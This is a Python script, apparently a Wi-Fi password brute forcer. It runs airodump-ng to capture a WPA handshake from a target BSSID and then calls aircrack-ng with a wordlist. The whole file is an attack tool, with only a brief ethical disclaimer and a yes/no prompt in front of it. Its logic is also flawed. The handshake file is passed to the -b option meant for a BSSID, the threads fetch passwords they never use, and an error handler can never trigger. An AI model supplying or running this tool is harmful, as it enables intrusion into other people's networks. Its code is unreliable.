import os
import subprocess
import time
import sys
import threading
from queue import Queue
import logging

# Constants
WORDLIST_FILE = "wordlist.txt"
LOG_FILE = "bruteforce.log"
HANDSHAKE_FILE = "handshake.cap"

# Global variables
wordlist_file = WORDLIST_FILE if os.path.exists(WORDLIST_FILE) else "not_defined"
password_queue = Queue()
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

# Ethical disclaimer
def ethical_disclaimer():
    print("""
    Wi-Fi Brute Forcer - Enhanced Version
    --------------------------------------
    This tool is for educational and ethical testing purposes only.
    Unauthorized access to networks is illegal and unethical.
    Only use this tool on networks you own or have explicit permission to test.
    """)
    consent = input("Do you agree to use this tool responsibly? (yes/no): ").strip().lower()
    if consent != "yes":
        print("Exiting...")
        sys.exit(0)

# Color echo function
def color_echo(color, text):
    colors = {
        "black": "\033[30m",
        "red": "\033[31m",
        "green": "\033[32m",
        "yellow": "\033[33m",
        "blue": "\033[34m",
        "magenta": "\033[35m",
        "cyan": "\033[36m",
        "white": "\033[37m",
    }
    print(f"{colors.get(color, '')}{text}\033[0m")

# Clear screen function
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# Capture Wi-Fi handshake
def capture_handshake(interface, bssid, channel):
    clear_screen()
    color_echo("yellow", "Starting handshake capture...")
    print(f"Target BSSID: {bssid}")
    print(f"Channel: {channel}")
    print(f"Interface: {interface}")
    print()

    # Start airodump-ng to capture the handshake
    try:
        subprocess.run(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "capture", interface], check=True)
    except subprocess.CalledProcessError as e:
        color_echo("red", f"Error capturing handshake: {e}")
        return False

    # Check if the handshake was captured
    if os.path.exists("capture-01.cap"):
        os.rename("capture-01.cap", HANDSHAKE_FILE)
        color_echo("green", "Handshake captured successfully!")
        return True
    else:
        color_echo("red", "Failed to capture handshake.")
        return False

# Crack the handshake using aircrack-ng
def crack_handshake(wordlist, handshake_file):
    clear_screen()
    color_echo("yellow", "Starting handshake cracking...")
    print(f"Wordlist: {wordlist}")
    print(f"Handshake file: {handshake_file}")
    print()

    try:
        result = subprocess.run(["aircrack-ng", "-w", wordlist, "-b", handshake_file], capture_output=True, text=True)
        if "KEY FOUND" in result.stdout:
            color_echo("green", "Password found!")
            print(result.stdout)
            return True
        else:
            color_echo("red", "Password not found in the wordlist.")
            return False
    except subprocess.CalledProcessError as e:
        color_echo("red", f"Error cracking handshake: {e}")
        return False

# Load wordlist into queue
def load_wordlist(wordlist_file):
    if not os.path.exists(wordlist_file):
        color_echo("red", f"Wordlist file '{wordlist_file}' not found.")
        return False

    with open(wordlist_file, "r") as file:
        for password in file:
            password_queue.put(password.strip())
    return True

# Multithreaded password cracking
def attempt_passwords(wordlist, handshake_file):
    while not password_queue.empty():
        password = password_queue.get()
        if crack_handshake(wordlist, handshake_file):
            logging.info(f"Success! Password: {password}")
            sys.exit(0)

# Main function
def main():
    ethical_disclaimer()

    # Check if aircrack-ng is installed
    try:
        subprocess.run(["aircrack-ng", "--help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        color_echo("red", "aircrack-ng is not installed. Please install it and try again.")
        sys.exit(1)

    # Get user input
    interface = input("Enter the wireless interface (e.g., wlan0): ").strip()
    bssid = input("Enter the target BSSID (e.g., 00:11:22:33:44:55): ").strip()
    channel = input("Enter the target channel (e.g., 6): ").strip()

    # Capture handshake
    if not capture_handshake(interface, bssid, channel):
        sys.exit(1)

    # Load wordlist
    wordlist_file = input("Enter the path to the wordlist file (e.g., wordlist.txt): ").strip()
    if not load_wordlist(wordlist_file):
        sys.exit(1)

    # Start multithreaded cracking
    threads = []
    for _ in range(4):  # Number of threads
        thread = threading.Thread(target=attempt_passwords, args=(wordlist_file, HANDSHAKE_FILE))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    color_echo("red", "Password not found in the wordlist.")

if __name__ == "__main__":
    main()